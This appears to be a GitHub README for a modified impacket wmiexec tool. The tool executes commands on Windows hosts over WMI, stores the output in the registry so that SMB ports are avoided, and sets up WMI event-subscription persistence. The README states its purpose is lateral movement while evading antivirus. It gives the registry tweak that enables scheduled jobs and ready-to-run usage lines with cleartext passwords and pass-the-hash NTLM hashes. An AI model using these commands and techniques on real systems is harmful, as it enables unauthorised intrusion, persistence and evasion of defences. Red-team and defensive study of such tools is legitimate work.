# wmiexec-RegOut

Modify version of impacket wmiexec.py, get output(data,response) from registry, don't need SMB connection, but I'm in the bad code :(

# Table of content

* [Overview](#overview)
* [Requirements](#Requirements)
* [Usage](#Usage)
* [Todo](#todo)
* [References](#References)

## Specially Thanks to:

- ### [@rootclay](https://github.com/rootclay), wechat: _xiangshan

## Overview

In original wmiexec.py, it get response from smb connection (port 445,139). Unfortunately, some antivirus software monitoring these ports as high risk.  
In this case, I drop smb connection function and use others method to execute command.

- wmiexec-reg-sch-UnderNT6-wip.py: Executed command by using win32-scheduledjob class. According to xiangshan, win32-scheduledjob class only works under windows NT6 (windows-server 2003).  
BTW, win32_scheduledjob has been disabled by default after windows NT6. Here is the way how to enable it.
```text
Key: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Configuration 
Name: EnableAt 
Type: REG_DWORD
Value: 1
```

- wmipersist-wip.py (Recommend): A Python version of [WMIHACKER](https://github.com/rootclay/WMIHACKER), which I picked the vbs template from it. Attacker can use it to do lateral movement safety under antivirus-software running.


- wmiexec-regOut.py: Just a simple Win32_Process.create method example .

## How it works?

- ### wmiexec-wip.py workflow:  
  Step 1:
   - WMIC authenticated remotly

  Step 2:
    - Use win32process class and call create method to execute command. Then, write down the result into C:\windows\temp directory named [uuid].txt

  Step 3:
    - Encode the file content to base64 strings (need to wait a few seconds)

  Step 4:
    - Add the converted base64 string into registry, and key name call [uuid]

  Step 5:
    - Get the base64 strings remotly and decode it locally.

- ### wmipersist-wip.py workflow:  
  Step 1:
   - Add custom vbs script into ActiveScriptEventConsumer class.

  Step 2:
   - Creating an Event Filter.

  Step 3:
   - Trigger FilterToConsumerBinding class to PWNED!

## Requirements

Generally, you just need to install official impacket.  
- [Portal](https://github.com/SecureAuthCorp/impacket)

## Usage
- ### wmiexec-wip.py usage:  
  With cleartext password
  ```bash
  python3 wmiexec-reg.py administrator:111qqq...@192.168.10.90 'whoami'
  ```
  ![image](https://user-images.githubusercontent.com/30458572/134797669-6d62e72f-a005-4001-aa47-09a9ffe86ae1.png)

  With NTLM hashes
  ```bash
  python3 wmiexec-reg.py -hashes e91d2eafde47de62c6c49a012b3a6af1:e91d2eafde47de62c6c49a012b3a6af1 administrator@192.168.10.90 'whoami'
  ```
  ![image](https://user-images.githubusercontent.com/30458572/137060383-7c13086c-0d4a-424d-a00a-561de836cacb.png)

- ### wmipersist-wip.py usage (Default is no output):  
  With cleartext password (without output)
  ```bash
  python3 wmipersist-wip.py administrator:111qqq...@192.168.10.20 'command'
  ```
  ![image](https://user-images.githubusercontent.com/30458572/137947814-2185d6b4-a20c-4bfc-804b-e5953bb016ac.png)

  With NTLM hashes
  ```bash
  python3 wmipersist-wip.py -hashes e91d2eafde47de62c6c49a012b3a6af1:e91d2eafde47de62c6c49a012b3a6af1 administrator@192.168.10.90 'whoami'
  ```
  ![image](https://user-images.githubusercontent.com/30458572/137948043-6d419057-5b62-45d4-a4df-e625b604dddd.png)

  With output
  ```bash
  python3 wmipersist-wip.py administrator:111qqq...@192.168.1.20 "whoami /priv" -with-output
  python3 wmipersist-wip.py administrator@192.168.1.20 "whoami /priv" -hashes e91d2eafde47de62c6c49a012b3a6af1:e91d2eafde47de62c6c49a012b3a6af1 -with-output
  ```
  ![image](https://user-images.githubusercontent.com/30458572/137948435-3f0fc14b-252f-411a-a681-9ba323edccb0.png)
  ![image](https://user-images.githubusercontent.com/30458572/137948639-c5f75993-bde2-47b9-8717-5e5309a36dd4.png)
  
  Under Huorong antivirus-software (Using WMIHACKER VBS template!!!)
  ![2ef86c8d934dc45498478aa9aedd91c](https://user-images.githubusercontent.com/30458572/137949219-b849be89-321e-4d1b-abf9-951509544679.png)

## Todo

- Optimize code (In bad code now.)
- Add more functions

## References
- https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
- https://github.com/360-Linton-Lab/WMIHACKER
- https://github.com/FortyNorthSecurity/WMIOps
- https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/operating-system-classes
